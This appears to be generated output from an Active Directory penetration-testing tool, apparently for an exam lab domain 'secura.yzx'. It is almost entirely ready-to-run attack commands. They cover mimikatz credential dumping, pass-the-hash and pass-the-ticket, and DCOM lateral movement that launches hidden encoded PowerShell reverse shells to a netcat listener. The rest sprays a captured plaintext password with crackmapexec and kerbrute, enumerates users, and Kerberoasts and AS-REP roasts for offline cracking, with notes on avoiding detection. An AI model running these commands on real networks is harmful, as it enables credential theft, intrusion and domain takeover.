### ERIC.WALLOWS@SECURA.YZX
**Credential:** password = `EricLikesRunning800`

**Targets (1):** SECURE

#### Credential Harvest Order

| # | Command | Priority |
|---|---------|----------|
| 1 | `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"` | HIGH |
| 2 | `mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"` | HIGH |
| 3 | `mimikatz.exe "privilege::debug" "lsadump::sam" "exit"` | MEDIUM |
| 4 | `mimikatz.exe "privilege::debug" "lsadump::secrets" "exit"` | MEDIUM |
| 5 | `mimikatz.exe "privilege::debug" "lsadump::cache" "exit"` | LOW |

#### With Harvested NTLM Hash

```
mimikatz.exe "sekurlsa::pth /user:ERIC.WALLOWS /domain:secura.yzx /ntlm:<HASH> /run:cmd.exe"
```
> ⚠️ Use HOSTNAME not IP after Overpass-the-Hash!

#### Pass-the-Ticket Workflow

**1. EXPORT TICKETS**
```
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
```
- Creates .kirbi files in current directory
- Look for *krbtgt*.kirbi files (TGTs) - HIGHEST PRIORITY
- TGT format: [session]-2-0-*-user@krbtgt-DOMAIN.kirbi

**2. IDENTIFY VALUABLE TICKETS**
| Priority | Pattern | Description |
|----------|---------|-------------|
| HIGHEST | `*krbtgt*.kirbi` | TGT - Can request ANY service ticket |
| HIGH | `*cifs*.kirbi` | File share access to specific host |
| MEDIUM | `*ldap*.kirbi` | LDAP access (enumeration) |
| LOW | `*http*.kirbi` | Web service access |

**3a. IMPORT TICKET (Windows)**
```
# Import
mimikatz.exe "kerberos::ptt <ticket.kirbi>" "exit"
# Verify
klist
```

**3b. IMPORT TICKET (Kali)**
```bash
# Convert
impacket-ticketConverter <ticket.kirbi> ticket.ccache
# Set env
export KRB5CCNAME=$(pwd)/ticket.ccache
# Verify
klist
```

**4. USE THE TICKET**
> ⚠️ **MUST use HOSTNAME not IP address!**

**Windows:**
```cmd
dir \\SECURE.domain.com\C$
type \\SECURE.domain.com\C$\Users\Administrator\Desktop\proof.txt
PsExec.exe \\SECURE.domain.com cmd.exe
```

**Kali:**
```bash
impacket-smbclient -k -no-pass SECURE.domain.com
impacket-psexec -k -no-pass user@SECURE.domain.com
impacket-secretsdump -k -no-pass user@SECURE.domain.com
```

**5. VERIFY ACCESS CHANGES**

```bash
crackmapexec smb SECURE.secura.yzx -u <USER> -p '<PASS>' --shares
crackmapexec smb SECURE.secura.yzx -k --shares  # With Kerberos ticket
```

**6. TROUBLESHOOTING**

- **klist shows no tickets after import**
  - Fix: Re-export on target, check timestamp, verify path to .kirbi
- **Access denied with valid ticket**
  - Fix: Use FQDN hostname, check klist expiry, export fresh ticket
- **KDC_ERR_PREAUTH_REQUIRED**
  - Fix: Verify KRB5CCNAME path is absolute, domain matches ticket

#### DCOM Lateral Movement (Fileless) -> <TARGET_HOST_IP>

> **TIP:** Run with `--lhost YOUR_IP --lport 443` for ready-to-use encoded payloads

**0. START LISTENER**
```bash
rlwrap nc -lvnp <LPORT>
```

**1. INSTANTIATE DCOM OBJECT**
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','<TARGET_HOST_IP>'))
```

**2. EXECUTE SHELL**

**[A] PowerShell TCP**
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e <BASE64_ENCODED>','7')
```

**[B] Download Cradle**
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e <BASE64_ENCODED>','7')
```

**[C] Powercat**
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e <BASE64_ENCODED>','7')
```

**TROUBLESHOOTING**
- Access denied: Verify local admin, check port 135
- No shell: Check firewall, verify listener


# Tailored Spray Commands

Based on BloodHound access relationships.

## Summary

- **Users with access:** 3
- **Target machines:** 2
- **Access types:** AdminTo, CanPSRemote, CanRDP

## Local Admin (AdminTo)

2 users, 2 unique target groups

### Group 1: 1 user(s) → 2 target(s)

**Users:** `administrator`

**Targets:**

- `DC01.SECURA.YZX` (192.168.179.97)
- `SECURE.SECURA.YZX` (192.168.179.95)

#### File-based commands

```bash
# Create user and target files
echo -e "administrator" > users_g1.txt
echo -e "192.168.179.97\n192.168.179.95" > targets_g1.txt
crackmapexec smb targets_g1.txt -u users_g1.txt -p '<PASSWORD>'
```

#### Inline bash loop

```bash
for user in administrator; do
  for target in 192.168.179.97 192.168.179.95; do
    crackmapexec smb $target -u $user -p '<PASSWORD>'
  done
done
```

**Alternative protocols:**

```bash
# WinRM (evil-winrm)
evil-winrm -i 192.168.179.97 -u administrator -p '<PASSWORD>'
```

```bash
# PSExec
impacket-psexec 'SECURA/administrator:<PASSWORD>'@192.168.179.97
```

```bash
# WMIExec
impacket-wmiexec 'SECURA/administrator:<PASSWORD>'@192.168.179.97
```

### Group 2: 1 user(s) → 1 target(s)

**Users:** `eric.wallows`

**Targets:**

- `SECURE.SECURA.YZX` (192.168.179.95)

#### File-based commands

```bash
# Create user and target files
echo -e "eric.wallows" > users_g2.txt
echo -e "192.168.179.95" > targets_g2.txt
crackmapexec smb targets_g2.txt -u users_g2.txt -p '<PASSWORD>'
```

#### Inline bash loop

```bash
for user in eric.wallows; do
  for target in 192.168.179.95; do
    crackmapexec smb $target -u $user -p '<PASSWORD>'
  done
done
```

**Alternative protocols:**

```bash
# WinRM (evil-winrm)
evil-winrm -i 192.168.179.95 -u eric.wallows -p '<PASSWORD>'
```

```bash
# PSExec
impacket-psexec 'SECURA/eric.wallows:<PASSWORD>'@192.168.179.95
```

```bash
# WMIExec
impacket-wmiexec 'SECURA/eric.wallows:<PASSWORD>'@192.168.179.95
```

## RDP Access (CanRDP)

1 users, 1 unique target groups

### Group 1: 1 user(s) → 1 target(s)

**Users:** `eric.wallows`

**Targets:**

- `SECURE.SECURA.YZX` (192.168.179.95)

#### File-based commands

```bash
# Create user and target files
echo -e "eric.wallows" > users_g1.txt
echo -e "192.168.179.95" > targets_g1.txt
xfreerdp /v:targets_g1.txt /u:users_g1.txt /p:'<PASSWORD>' /cert:ignore
```

#### Inline bash loop

```bash
for user in eric.wallows; do
  for target in 192.168.179.95; do
    xfreerdp /v:$target /u:$user /p:'<PASSWORD>' /cert:ignore
  done
done
```

**Alternative protocols:**

```bash
# rdesktop
rdesktop -u eric.wallows -p '<PASSWORD>' 192.168.179.95
```

## PS Remoting (CanPSRemote)

2 users, 2 unique target groups

### Group 1: 1 user(s) → 1 target(s)

**Users:** `charlotte`

**Targets:**

- `DC01.SECURA.YZX` (192.168.179.97)

#### File-based commands

```bash
# Create user and target files
echo -e "charlotte" > users_g1.txt
echo -e "192.168.179.97" > targets_g1.txt
evil-winrm -i targets_g1.txt -u users_g1.txt -p '<PASSWORD>'
```

#### Inline bash loop

```bash
for user in charlotte; do
  for target in 192.168.179.97; do
    evil-winrm -i $target -u $user -p '<PASSWORD>'
  done
done
```

**Alternative protocols:**

```bash
# WinRM (CrackMapExec)
crackmapexec winrm 192.168.179.97 -u charlotte -p '<PASSWORD>'
```

### Group 2: 1 user(s) → 1 target(s)

**Users:** `eric.wallows`

**Targets:**

- `SECURE.SECURA.YZX` (192.168.179.95)

#### File-based commands

```bash
# Create user and target files
echo -e "eric.wallows" > users_g2.txt
echo -e "192.168.179.95" > targets_g2.txt
evil-winrm -i targets_g2.txt -u users_g2.txt -p '<PASSWORD>'
```

#### Inline bash loop

```bash
for user in eric.wallows; do
  for target in 192.168.179.95; do
    evil-winrm -i $target -u $user -p '<PASSWORD>'
  done
done
```

**Alternative protocols:**

```bash
# WinRM (CrackMapExec)
crackmapexec winrm 192.168.179.95 -u eric.wallows -p '<PASSWORD>'
```

## Monolithic Spray

One attempt per user on their best target. Set `PASSWORD` once at the top.

### Edge Selection Logic

```
  2 users via AdminTo (local admin → SMB auth)
  1 user via CanPSRemote (WinRM → evil-winrm auth)
  0 users via CanRDP (RDP → xfreerdp3 auth) - 1 avoided (had better options)
  Priority: AdminTo > CanPSRemote > CanRDP > ExecuteDCOM > ReadLAPSPassword
  Each user sprayed exactly once on their highest-privilege target
```

### Commands

```bash
PASSWORD='<PASSWORD>'

# --- administrator → 192.168.179.97 (DC01) ---
# AdminTo (direct): MATCH (administrator)-[:AdminTo]->(DC01)
crackmapexec smb 192.168.179.97 -u administrator -p "$PASSWORD"

# --- charlotte → 192.168.179.97 (DC01) ---
# CanPSRemote (direct): MATCH (charlotte)-[:CanPSRemote]->(DC01)
evil-winrm -i 192.168.179.97 -u charlotte -p "$PASSWORD"

# --- eric.wallows → 192.168.179.95 (SECURE) ---
# AdminTo (direct): MATCH (eric.wallows)-[:AdminTo]->(SECURE)
# Note: User also has CanRDP, using AdminTo instead
crackmapexec smb 192.168.179.95 -u eric.wallows -p "$PASSWORD"

```

---

> **NOTE:** Replace `<PASSWORD>` with actual credentials.


## 🔑 Password Spray Recommendations

### Captured Passwords

```
EricLikesRunning800
```

### Spray Methods

#### Method 1: SMB-Based Spray (crackmapexec/netexec)

Ports: 445 | Noise: HIGH

```bash
crackmapexec smb 192.168.179.97 -u users.txt -p 'EricLikesRunning800' -d secura.yzx --continue-on-success
```
- ✅ Shows admin access (Pwn3d!), validates creds + checks admin in one step
- ❌ Very noisy (Event logs 4625), triggers lockouts, detected by EDR

#### Method 2: Kerberos TGT-Based Spray (kerbrute)

Ports: 88 | Noise: LOW

```bash
kerbrute passwordspray -d secura.yzx --dc 192.168.179.97 users.txt 'EricLikesRunning800'
```
- ✅ Fastest, stealthiest - only 2 UDP frames per attempt, pre-auth check avoids lockouts for invalid users
- ❌ No admin check (just validates creds), requires valid userlist, Kerberos only

#### Method 3: LDAP/ADSI-Based Spray (PowerShell)

Ports: 389, 636 | Noise: MEDIUM

```bash
Invoke-DomainPasswordSpray -UserList users.txt -Password 'EricLikesRunning800' -Verbose
```
- ✅ Built into Windows - no external tools needed, uses native APIs, scriptable
- ❌ Windows-only, slower than Kerberos, requires PowerShell access on target

### User Enumeration

**Enumerate valid users via Kerberos pre-auth**
```bash
kerbrute userenum -d secura.yzx --dc 192.168.179.97 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt && cut -d' ' -f8 valid_users.txt | cut -d'@' -f1 > users.txt
```

**LDAP enumeration with credentials**
```bash
ldapsearch -x -H ldap://192.168.179.97 -D 'secura.yzx\ERIC.WALLOWS' -w '<PASSWORD>' -b '<DOMAIN_DN>' '(objectClass=user)' sAMAccountName | grep sAMAccountName | cut -d' ' -f2 > users.txt
```

**CME user enumeration (authenticated)**
```bash
crackmapexec smb 192.168.179.97 -u 'ERIC.WALLOWS' -p '<PASSWORD>' -d secura.yzx --users | awk '{print $5}' | grep -v '\[' > users.txt
```

**Export users from BloodHound Neo4j (clean output)**
```bash
echo "MATCH (u:User) WHERE u.name IS NOT NULL AND NOT u.name STARTS WITH 'NT AUTHORITY' RETURN u.samaccountname" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' > users.txt
```

**RPC user enumeration**
```bash
rpcclient -U 'ERIC.WALLOWS%<PASSWORD>' 192.168.179.97 -c 'enumdomusers' | grep -oP '\[.*?\]' | tr -d '[]' | cut -d' ' -f1 > users.txt
```

**enum4linux user enumeration (unauthenticated if allowed)**
```bash
enum4linux -U 192.168.179.97 | grep 'user:' | cut -d':' -f2 | awk '{print $1}' > users.txt
```

### Spray One-Liners

**1. Full Neo4j Spray (Stealth)**
_Export non-pwned users + passwords from Neo4j, spray with kerbrute_
```bash
echo "MATCH (u:User) WHERE (u.pwned IS NULL OR u.pwned = false) AND u.enabled = true AND u.name IS NOT NULL AND NOT u.name STARTS WITH 'NT AUTHORITY' RETURN u.samaccountname" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' > targets.txt && echo "MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' | sort -u > spray_passwords.txt && for p in $(cat spray_passwords.txt); do kerbrute passwordspray -d secura.yzx --dc 192.168.179.97 targets.txt "$p"; sleep 1800; done
```

**2. Neo4j Spray + Admin Check (CME)**
_Export from Neo4j, spray with CME to identify admin access (Pwn3d!)_
```bash
echo "MATCH (u:User) WHERE (u.pwned IS NULL OR u.pwned = false) AND u.enabled = true RETURN u.samaccountname" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' > targets.txt && echo "MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | sort -u > spray_passwords.txt && crackmapexec smb 192.168.179.97 -u targets.txt -p spray_passwords.txt -d secura.yzx --continue-on-success --no-bruteforce
```

**3. AS-REP Roast -> Crack -> Spray**
_Roast AS-REP users, crack hashes, spray cracked passwords_
```bash
impacket-GetNPUsers -dc-ip 192.168.179.97 -request -outputfile asrep.txt secura.yzx/ && hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --show | cut -d':' -f2 >> spray_passwords.txt && crackmapexec smb 192.168.179.97 -u users.txt -p spray_passwords.txt -d secura.yzx --continue-on-success --no-bruteforce
```

**4. Kerberoast -> Crack -> Spray**
_Kerberoast SPNs, crack TGS hashes, spray cracked passwords_
```bash
impacket-GetUserSPNs -dc-ip 192.168.179.97 -request -outputfile kerberoast.txt 'secura.yzx/ERIC.WALLOWS:EricLikesRunning800' && hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --show | cut -d':' -f2 >> spray_passwords.txt && crackmapexec smb 192.168.179.97 -u users.txt -p spray_passwords.txt -d secura.yzx --continue-on-success --no-bruteforce
```

**5. CeWL -> Mutate -> Spray**
_Generate wordlist from website, apply mutations, spray_
```bash
cewl -d 2 -m 5 -w cewl_words.txt <TARGET_URL> && hashcat --stdout -r /usr/share/hashcat/rules/best64.rule cewl_words.txt | sort -u > spray_passwords.txt && kerbrute passwordspray -d secura.yzx --dc 192.168.179.97 users.txt spray_passwords.txt
```

> **EXAM TIP:** Before spraying, check `net accounts` for lockout policy.
